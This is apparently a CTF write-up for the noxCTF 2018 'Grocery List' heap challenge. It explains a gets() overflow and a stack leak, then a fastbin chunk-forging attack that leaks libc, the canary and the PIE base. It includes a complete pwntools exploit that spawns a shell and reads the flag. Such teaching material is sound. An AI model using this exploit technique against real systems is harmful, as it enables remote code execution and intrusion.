+++
title = "noxCTF 2018 - Grocery List"
date = "2018-09-09 15:31:34"
categories = ["pwn", "writeup"]
+++

> Downloads: 
>
> [GroceryList](/assets/noxCTF/grocery_list/GroceryList)
>
> [solve.py](/assets/noxCTF/grocery_list/solve.py)

## intro
```
λ › checksec ./GroceryList
[*] '/Challs/noxCTF/pwn/grocery_list/GroceryList'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
λ › ./GroceryList
Hello and welcome to the grocery List! Here you can manage the list of items you would like to buy.
What would you like to do?
1. Print the list
2. Add item to the list
3. Add empty items to the list
4. Remove an item from the list
5. Edit an existing item
6. Add default example
7. Exit
3
What is the size of your items?
1. Small
2. Medium
3. Large
1
How many items would you like to add?
1
^C
```

```
I really hate it when I forget what I wanted to buy.
That's why I created the FASTEST Grocery List in the world.
Go check it out.
nc chal.noxale.com 1232
```

This is like any usual heap exploitation challanges, we have `print`, `remove`, `edit`, and `add` items in/to the lists. The main loop roughly looks like this,

```C
  int select;
  char grocery_item[12] = "Grocery Item";
  do {
    puts_("What would you like to do?");
    puts_("1. Print the list");
    puts_("2. Add item to the list");
    puts_("3. Add empty items to the list");
    puts_("4. Remove an item from the list");
    puts_("5. Edit an existing item");
    puts_("6. Add default example");
    puts_("7. Exit");
    fflush(stdin);
    scanf("%d", &select);
    switch ( select ) {
      case 1:
        print_all();
        break;
      case 2:
        add_item();
        break;
      case 3:
        add_empty();
        break;
      case 4:
        delete_item();
        break;
      case 5:
        edit_item();
        break;
      case 6:
        add_default(grocery_item);
        break;
      case 7:
        puts_("Goodbye\n");
        free_all();
        break;
      default:
        puts_("Invalid choice\n");
        break;
    }
  } while ( select != 7 );
```

Looks good, but we have some limitation on malloc chunk size, only FASTBIN allowed `small = 0x10`, `medium = 0x38`, and `large = 0x60`. This actually confirms the challange description `the FASTEST Grocery List in the world`, well, yes _FASTEST_ bin.

## overflow
In `edit` we have overflow using `gets()`,
```C
    puts_("Which item would you like to edit?");
    fflush(stdin);
    scanf("%d", &index);
    if ( index < 0 || count <= index ) {
      puts_("Invalid index\n");
    } else {
      puts_("Enter your item`s new name: ");
      gets(ptr_list[index]);
      item = ptr_list[v2];
      item[strcspn(ptr_list[index], "\n")] = 0;
    }
```

## leak
In `add_default`, the argument isn't passed properly, instead of copying it's value, it's actually copied the pointer to grocery_item on stack. Thus, we have stack leak.
```
    add_default()
    stack = u64(dump_all()[0].ljust(8, '\x00'))
    log.info('stack ' + hex(stack))

gdb-peda$ x/10gx 0x555555554000+0x202040
0x555555756040: 0x0000555555758430      0x0000000000000000
0x555555756050: 0x0000000000000000      0x0000000000000000
0x555555756060: 0x0000000000000000      0x0000000000000000
0x555555756070: 0x0000000000000000      0x0000000000000000
gdb-peda$ x/10gx 0x0000555555758420
0x555555758420: 0x0000000000000000      0x0000000000000021
0x555555758430: 0x00007fffffffeceb      0x0000000000000000
0x555555758440: 0x0000000000000000      0x000000000001fbc1
0x555555758450: 0x0000000000000000      0x0000000000000000
0x555555758460: 0x0000000000000000      0x0000000000000000
```

## fastbin-attack, forging-chunk
In simple form, we will corrupt FD pointer to trick malloc serving us a controlled pointer. We have stack address leak, so it should be good destination for this. 
```
gdb-peda$ x/10gx 0x00007fffffffecd0
0x7fffffffecd0: 0x00000000ffffecfe      0x0000000000000021
0x7fffffffece0: 0x00002aaaaacf3830      0x65636f7247554910
0x7fffffffecf0: 0x006d657449207972      0x4226f8d697e7ba00
0x7fffffffed00: 0x0000555555555380      0x00002aaaaacf3830
0x7fffffffed10: 0x0000000000000001      0x00007fffffffede8
```
welp. Right off the bat, `0x7fffffffecd0` should be good enough, beacause the it passes the request size check for `__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)`.
```
    add_empty(1, 4)
	remove_item(1)
	remove_item(1)

gdb-peda$ x/20gx 0x0000555555758420
0x555555758420: 0x0000000000000000      0x0000000000000021 <- item 0
0x555555758430: 0x0000000000000000      0x0000000000000000
0x555555758440: 0x0000000000000000      0x0000000000000021 <- item 1, already free
0x555555758450: 0x0000000000000000      0x0000000000000000
0x555555758460: 0x0000000000000000      0x0000000000000021 <- item 2, free
0x555555758470: 0x0000555555758440      0x0000000000000000 # FD
0x555555758480: 0x0000000000000000      0x0000000000000021 <- item 3
0x555555758490: 0x0000000000000000      0x0000000000000000
0x5555557584a0: 0x0000000000000000      0x000000000001fb61

    payload  = p64(0) * 3
    payload += p64(0x21)
    payload += p64(0) * 3
    payload += p64(0x21)
    payload += p64(stack - 0x1b)
    edit_item(0, payload)

gdb-peda$ x/20gx 0x0000555555758420
0x555555758420: 0x0000000000000000      0x0000000000000021 <- item 0
0x555555758430: 0x0000000000000000      0x0000000000000000
0x555555758440: 0x0000000000000000      0x0000000000000021 <- item 1, already free
0x555555758450: 0x0000000000000000      0x0000000000000000
0x555555758460: 0x0000000000000000      0x0000000000000021 <- item 2, free
0x555555758470: 0x00007fffffffecd0      0x0000000000000000 # FD corrupted
0x555555758480: 0x0000000000000000      0x0000000000000021 <- item 3
```
So, after this the next allocation for items should have our controlled pointer,
```
    add_empty(1, 2)

gdb-peda$ x/10gx 0x555555554000+0x202040
0x555555756040: 0x0000555555758430      0x0000555555758490
0x555555756050: 0x0000555555758470      0x00007fffffffece0 <- controlled !!
0x555555756060: 0x0000000000000000      0x0000000000000000
0x555555756070: 0x0000000000000000      0x0000000000000000
0x555555756080: 0x0000000000000000      0x0000000000000000
```
This will eventually lead to libc leak too, since `0x00007fffffffece0` contains the address of `__libc_start_main+241`. Ok, we have overflow, controlled pointer at stack, libc leak, is it done? Well, sadly, not yet. We should bypass some more protection on binary, stack canary and this custom protection at the end of `main` function.
```
if ( *(rbp+0x8) != (void *)bss_retAddr || *(rbp-0x20) != (void *)bss_retAddr )
    exit(1);
```
We can't use overflow and `dump_all` to leak canary, because at the end of buffer null byte appended. So, from this point it's just forging chunks and fastbin attack with different size (we still have medium and large sized fastbins to use), to leak canary, pie base, and stuff.

Wonder why I'm not using `__malloc_hook` or stuff like that? Well, sadly, no satisfied offset from any one_gadget RCE, simply we can't use `__malloc_hook` on this challanges, or is it(?).

## full exploit
```python
#!/usr/bin/env python
from pwn import *
import sys

gdbcmd = '''
b *{}+0x1283
'''

# context.terminal = 'kitty @ new-window --keep-focus sh -c'.split()

if sys.argv.__len__() == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process(sys.argv[1], aslr=False, env={'LD_PRELOAD' : '/home/vagrant/ctf/nox/pwn/grocery_list/libc.so'})
    # r = process(sys.argv[1], aslr=False)
    gdb.attach(r, gdbcmd.format(0x555555554000))
    # r = process(sys.argv[1])

def dump_all():
    r.sendlineafter('7. Exit', '1')
    r.recvuntil('----------\n')
    content = r.recvuntil('\n----------', drop=True)
    content = content.splitlines()
    content = [x.split('. ')[1] for x in content]
    return content

def add_item(size, payload):
    r.sendlineafter('7. Exit', '2')
    r.sendlineafter('items?', str(size))
    r.sendlineafter('name:', payload)

def add_empty(size, count):
    r.sendlineafter('7. Exit', '3')
    r.sendlineafter('items?', str(size))
    r.sendlineafter('add?', str(count))

def remove_item(ID):
    r.sendlineafter('7. Exit', '4')
    r.sendlineafter('remove?', str(ID))

def edit_item(ID, payload):
    r.sendlineafter('7. Exit', '5')
    r.sendlineafter('edit?', str(ID))
    r.sendlineafter('name:', payload)

def add_default():
    r.sendlineafter('7. Exit', '6')

def _exit():
    r.sendlineafter('7. Exit', '7')

add_default()
stack = u64(dump_all()[0].ljust(8, '\x00'))
log.info('stack ' + hex(stack))
remove_item(0)

add_empty(1, 4)
remove_item(1)
remove_item(1)
payload  = p64(0) * 3
payload += p64(0x21)
payload += p64(0) * 3
payload += p64(0x21)
payload += p64(stack - 0x1b)
edit_item(0, payload)
add_empty(1, 2)

libc = u64(dump_all()[3].ljust(8, '\x00')) - 0x20830
log.info('libc ' + hex(libc))

remove_item(0)
remove_item(0)
remove_item(0)

payload  = p64(libc + 0x20830)
payload += p64(0)
payload += p64(0x4100)
edit_item(0, payload)

add_empty(2, 4)
remove_item(2)
remove_item(2)
payload  = p64(0) * 7
payload += p64(0x41)
payload += p64(0) * 7
payload += p64(0x41)
payload += p64(stack - 2)
edit_item(1, payload)
add_empty(2, 2)

remove_item(1)
remove_item(1)
remove_item(1)

canary = u64(dump_all()[1][:7].rjust(8, '\x00'))
pie = u64(dump_all()[1][7:].ljust(8, '\x00')) - 0x1380
log.info('canary ' + hex(canary))
log.info('pie ' + hex(pie))

add_empty(3, 4)
remove_item(3)
remove_item(3)
payload  = p64(0) * 13
payload += p64(0x71)
payload += p64(0) * 13
payload += p64(0x71)
payload += p64(pie + 0x20202d)
edit_item(2, payload)
add_empty(3, 2)

remove_item(2)
# gdb.attach(r, gdbcmd.format(pie))
remove_item(2)
remove_item(2)

payload  = p64(libc + 0x45216)
payload += p64(0) * 2
payload += p64(canary)
payload += p64(pie + 0x1380)
payload += p64(libc + 0x45216)
edit_item(0, payload)

payload  = '\x00' * 3
payload += p64(stack - 0xb)
payload += p64(stack - 2 + 16)
payload += p64(pie + 0x20203d)
payload += p64(0) * 18
payload += p64(libc + 0x45216)
edit_item(2, payload)

_exit()
r.interactive()
```

## flag
```
λ › python solve.py chal.noxale.com 1232
[+] Opening connection to chal.noxale.com on port 1232: Done
[*] stack 0x7ffec128fb3b
[*] libc 0x7fdf29bb9000
[*] canary 0xedc677284751c5
[*] pie 0x55a4c8cd3000
[*] Switching to interactive mode

Goodbye

$ ls
GroceryList
flag
$ cat flag
noxCTF{I_L0ve_F0rg1ng_Chunk5}
$ 
[*] Closed connection to chal.noxale.com port 1232
```